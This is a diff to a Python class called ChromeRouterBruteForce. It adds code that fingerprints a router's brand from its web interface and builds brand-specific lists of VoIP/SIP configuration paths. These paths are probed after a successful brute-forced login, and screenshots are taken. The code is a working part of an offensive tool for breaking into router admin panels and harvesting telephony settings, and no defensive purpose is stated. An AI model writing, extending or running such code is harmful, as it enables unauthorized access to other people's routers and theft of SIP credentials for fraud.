@@ -926,6 +926,162 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error finding VoIP/SIP pages: {e}{Colors.END}")
             return []
     
+    def identify_router_brand(self):
+        """Identify router brand and model from page content"""
+        try:
+            print(f"{Colors.CYAN}[*] Identifying router brand and model...{Colors.END}")
+            
+            # Get page content
+            page_source = self.driver.page_source.lower()
+            title = self.driver.title.lower()
+            current_url = self.driver.current_url.lower()
+            
+            # Router brand patterns
+            brands = {
+                'tp-link': ['tp-link', 'tplink', 'tplink', 'tp link'],
+                'cisco': ['cisco', 'linksys'],
+                'netgear': ['netgear'],
+                'd-link': ['d-link', 'dlink', 'd link'],
+                'asus': ['asus'],
+                'belkin': ['belkin'],
+                'zyxel': ['zyxel'],
+                'huawei': ['huawei'],
+                'zte': ['zte'],
+                'mikrotik': ['mikrotik', 'routeros'],
+                'ubiquiti': ['ubiquiti', 'unifi'],
+                'arris': ['arris'],
+                'motorola': ['motorola'],
+                'actiontec': ['actiontec'],
+                'netcomm': ['netcomm'],
+                'broadcom': ['broadcom'],
+                'realtek': ['realtek']
+            }
+            
+            detected_brands = []
+            
+            # Check title and content for brand indicators
+            for brand, patterns in brands.items():
+                for pattern in patterns:
+                    if pattern in page_source or pattern in title or pattern in current_url:
+                        detected_brands.append(brand)
+                        print(f"{Colors.GREEN}[+] Detected router brand: {brand.upper()} (pattern: {pattern}){Colors.END}")
+                        break
+            
+            # Check for model indicators
+            model_indicators = [
+                'router', 'gateway', 'access point', 'ap', 'wifi', 'wireless',
+                'adsl', 'dsl', 'cable', 'fiber', 'broadband'
+            ]
+            
+            detected_models = []
+            for indicator in model_indicators:
+                if indicator in title or indicator in page_source:
+                    detected_models.append(indicator)
+            
+            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
+            print(f"{Colors.BLUE}[*] Detected brands: {detected_brands}{Colors.END}")
+            print(f"{Colors.BLUE}[*] Model indicators: {detected_models}{Colors.END}")
+            
+            return detected_brands, detected_models
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error identifying router brand: {e}{Colors.END}")
+            return [], []
+    
+    def get_brand_specific_voip_paths(self, brands):
+        """Get VoIP/SIP paths specific to detected router brands"""
+        try:
+            print(f"{Colors.CYAN}[*] Getting brand-specific VoIP/SIP paths...{Colors.END}")
+            
+            # Brand-specific VoIP/SIP paths
+            brand_paths = {
+                'tp-link': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone',
+                    '/advanced/voip.html', '/advanced/sip.html', '/advanced/voice.html',
+                    '/network/voip.html', '/network/sip.html',
+                    '/admin/voip.html', '/admin/sip.html',
+                    '/voip_config.html', '/sip_config.html',
+                    '/voip_status.html', '/sip_status.html',
+                    '/voice_config.html', '/telephony_config.html'
+                ],
+                'cisco': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone',
+                    '/advanced/voip.html', '/advanced/sip.html',
+                    '/network/voip.html', '/network/sip.html',
+                    '/admin/voip.html', '/admin/sip.html',
+                    '/voip_config.html', '/sip_config.html',
+                    '/voice_config.html', '/telephony_config.html',
+                    '/call_manager.html', '/unified_communications.html'
+                ],
+                'netgear': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone',
+                    '/advanced/voip.html', '/advanced/sip.html',
+                    '/network/voip.html', '/network/sip.html',
+                    '/admin/voip.html', '/admin/sip.html',
+                    '/voip_config.html', '/sip_config.html',
+                    '/voice_config.html', '/telephony_config.html'
+                ],
+                'd-link': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone',
+                    '/advanced/voip.html', '/advanced/sip.html',
+                    '/network/voip.html', '/network/sip.html',
+                    '/admin/voip.html', '/admin/sip.html',
+                    '/voip_config.html', '/sip_config.html',
+                    '/voice_config.html', '/telephony_config.html'
+                ],
+                'asus': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone',
+                    '/advanced/voip.html', '/advanced/sip.html',
+                    '/network/voip.html', '/network/sip.html',
+                    '/admin/voip.html', '/admin/sip.html',
+                    '/voip_config.html', '/sip_config.html',
+                    '/voice_config.html', '/telephony_config.html'
+                ],
+                'generic': [
+                    '/voip', '/sip', '/voice', '/telephony', '/phone', '/fax',
+                    '/advanced/voip', '/advanced/sip', '/advanced/voice', '/advanced/telephony',
+                    '/network/voip', '/network/sip', '/network/voice', '/network/telephony',
+                    '/admin/voip', '/admin/sip', '/admin/voice', '/admin/telephony',
+                    '/config/voip', '/config/sip', '/config/voice', '/config/telephony',
+                    '/settings/voip', '/settings/sip', '/settings/voice', '/settings/telephony',
+                    '/system/voip', '/system/sip', '/system/voice', '/system/telephony',
+                    '/voip.html', '/sip.html', '/voice.html', '/telephony.html', '/phone.html',
+                    '/advanced_voip.html', '/advanced_sip.html', '/voip_config.html', '/sip_config.html',
+                    '/voip_configuration.html', '/sip_configuration.html', '/voice_config.html',
+                    '/phone_config.html', '/telephony_config.html', '/pbx.html', '/trunk.html',
+                    '/call_routing.html', '/extension.html', '/gateway.html', '/proxy.html',
+                    '/call_forwarding.html', '/voicemail.html', '/conference.html', '/hold.html',
+                    '/dial_plan.html', '/codec.html', '/dtmf.html', '/ringtone.html',
+                    '/call_transfer.html', '/call_waiting.html', '/caller_id.html'
+                ]
+            }
+            
+            all_paths = []
+            
+            # Add brand-specific paths
+            for brand in brands:
+                if brand in brand_paths:
+                    all_paths.extend(brand_paths[brand])
+                    print(f"{Colors.GREEN}[+] Added {len(brand_paths[brand])} paths for {brand.upper()}{Colors.END}")
+            
+            # Always add generic paths
+            all_paths.extend(brand_paths['generic'])
+            
+            # Remove duplicates while preserving order
+            unique_paths = []
+            seen = set()
+            for path in all_paths:
+                if path not in seen:
+                    unique_paths.append(path)
+                    seen.add(path)
+            
+            print(f"{Colors.BLUE}[*] Total unique VoIP/SIP paths: {len(unique_paths)}{Colors.END}")
+            return unique_paths
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error getting brand-specific paths: {e}{Colors.END}")
+            return []
+    
     def search_voip_after_success(self, login_url, username, password):
         """Search for VoIP/SIP pages after successful login"""
         try:
@@ -936,31 +1092,38 @@ class ChromeRouterBruteForce:
             parsed_url = urlparse(login_url)
             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
             
-            # Always try VoIP search regardless of admin panel detection
-            print(f"{Colors.BLUE}[*] Starting comprehensive VoIP/SIP search...{Colors.END}")
+            # Step 1: Identify router brand and model
+            brands, models = self.identify_router_brand()
+            
+            # Step 2: Get brand-specific VoIP/SIP paths
+            voip_paths = self.get_brand_specific_voip_paths(brands)
+            
+            print(f"{Colors.BLUE}[*] Starting intelligent VoIP/SIP search...{Colors.END}")
             
             screenshots_taken = []
             
-            # Method 1: Try direct VoIP/SIP paths immediately
-            print(f"{Colors.BLUE}[*] Method 1: Testing direct VoIP/SIP paths...{Colors.END}")
+            # Method 1: Try brand-specific and generic VoIP/SIP paths
+            print(f"{Colors.BLUE}[*] Method 1: Testing brand-specific VoIP/SIP paths...{Colors.END}")
             
-            voip_paths = [
-                "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
-                "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
-                "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
-                "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
-                "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
-                "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
-                "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
-                "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
-                "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
-                "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
-                "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
-                "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
-                "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
-                "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
-                "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
-            ]
+            if not voip_paths:
+                # Fallback to generic paths if brand detection failed
+                voip_paths = [
+                    "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
+                    "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
+                    "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
+                    "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
+                    "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
+                    "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
+                    "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
+                    "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
+                    "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
+                    "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
+                    "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
+                    "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
+                    "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
+                    "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
+                    "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
+                ]
             
             for i, path in enumerate(voip_paths):
                 try:
